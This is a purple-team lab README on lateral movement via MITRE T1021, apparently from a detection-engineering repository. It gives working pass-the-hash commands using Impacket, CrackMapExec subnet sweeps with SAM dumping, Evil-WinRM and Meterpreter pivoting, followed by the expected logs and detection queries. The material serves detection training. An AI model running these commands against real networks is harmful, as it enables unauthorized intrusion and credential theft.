# 04 - Lateral Movement (T1021)

## Description

Lateral movement allows an attacker to move from the initially compromised machine to other systems in the network. This simulation uses credential material harvested in the previous step to authenticate to other hosts.

**MITRE ATT&CK:** [T1021 - Remote Services](https://attack.mitre.org/techniques/T1021/)

## Sub-techniques Covered

- T1021.002 — SMB / Windows Admin Shares
- T1021.006 — Windows Remote Management (WinRM)
- T1550.002 — Pass-the-Hash (PTH)

## Prerequisites

- NTLM hash or plaintext credential from [02-credential-harvesting](../02-credential-harvesting/README.md)
- Second Windows victim on the same network (192.168.20.0/24)
- Impacket toolkit installed on Kali Linux

## Steps to Reproduce

### Method A: Pass-the-Hash via SMB (Impacket)

Use a harvested NTLM hash without needing the plaintext password:

```bash
# Format: username:hash
# Replace with values from credential harvesting step
psexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c Administrator@192.168.20.31

# Or use wmiexec for less-detected execution
wmiexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c Administrator@192.168.20.31
```

### Method B: Pass-the-Hash via CrackMapExec

```bash
# Test credential against entire subnet
crackmapexec smb 192.168.20.0/24 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c

# Execute a command on all authenticated hosts
crackmapexec smb 192.168.20.0/24 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c -x "whoami"

# Dump SAM on all authenticated hosts
crackmapexec smb 192.168.20.0/24 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c --sam
```

### Method C: WinRM with Plaintext Credentials

```bash
# Using Evil-WinRM
evil-winrm -i 192.168.20.31 -u Administrator -p "Password123"

# Using PowerShell remoting
Enter-PSSession -ComputerName 192.168.20.31 -Credential Administrator
```

### Method D: Meterpreter — Pivot to New Host

From an existing Meterpreter session on host A:

```
meterpreter > run post/multi/manage/shell_to_meterpreter
meterpreter > route add 192.168.20.0/24 <session-id>
meterpreter > use exploit/windows/smb/psexec
meterpreter > set SMBUser Administrator
meterpreter > set SMBPass aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
meterpreter > set RHOSTS 192.168.20.31
meterpreter > run
```

## Expected Network Traffic

- SMB traffic (TCP 445) from victim A to victim B
- Named pipe connections: `\IPC$`, `\ADMIN$`
- WMI traffic (TCP 135, dynamic high ports) if using wmiexec
- RDP traffic (TCP 3389) if using RDP lateral movement

## Expected Log Entries

### Windows Security Event 4624 — Network Logon (Type 3)

```
EventID: 4624
LogonType: 3
AccountName: Administrator
IpAddress: 192.168.20.20  (source: first victim)
LogonProcessName: NtLmSsp
AuthenticationPackageName: NTLM
```

### Windows Security Event 4648 — Explicit Credential Logon

```
EventID: 4648
TargetUserName: Administrator
TargetServerName: 192.168.20.31
ProcessName: C:\Windows\System32\wbem\WmiPrvSE.exe
```

### Sysmon Event ID 3 — Network Connection

```xml
EventID: 3
Image: C:\Windows\System32\wbem\WmiPrvSE.exe
DestinationIp: 192.168.20.31
DestinationPort: 445
```

## Detection Opportunities

| Indicator | Log Source | Query |
|-----------|-----------|-------|
| Network logon Type 3 with NTLM | Security Event 4624 | `EventID=4624 LogonType=3 AuthenticationPackageName=NTLM` |
| ADMIN$ share access | Security Event 5140 | `EventID=5140 ShareName=\\*\ADMIN$` |
| WMI execution | Sysmon Event 1 | `EventID=1 ParentImage=*\WmiPrvSE.exe` |
| PSExec pattern | Sysmon Event 1 | `EventID=1 Image=*\PSEXESVC.exe` |

See [../../detections/splunk-queries/README.md](../../detections/splunk-queries/README.md) for SPL detection queries.
